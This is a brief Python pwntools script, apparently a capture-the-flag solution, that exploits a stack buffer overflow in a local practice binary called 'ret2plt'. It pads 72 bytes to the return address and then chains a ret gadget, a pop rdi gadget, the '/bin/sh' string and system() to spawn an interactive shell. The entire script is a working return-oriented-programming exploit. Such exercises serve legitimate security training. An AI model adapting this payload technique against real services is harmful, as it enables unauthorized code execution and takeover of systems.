from pwn import *
context.binary = elf = ELF('./ret2plt', checksec=False)
p = process(elf.path)


offset_to_rip=72
ret=ROP(elf).find_gadget(['ret']).address
binsh = next(elf.search(b'/bin/sh\x00'))

p.recvuntil(b'What would you like to order?\n')
payload = flat(
  b'A'*offset_to_rip,
  ret,
  elf.sym.pop_rdi_ret,
  binsh,
  elf.sym.system,
)

p.send(payload)
p.interactive()
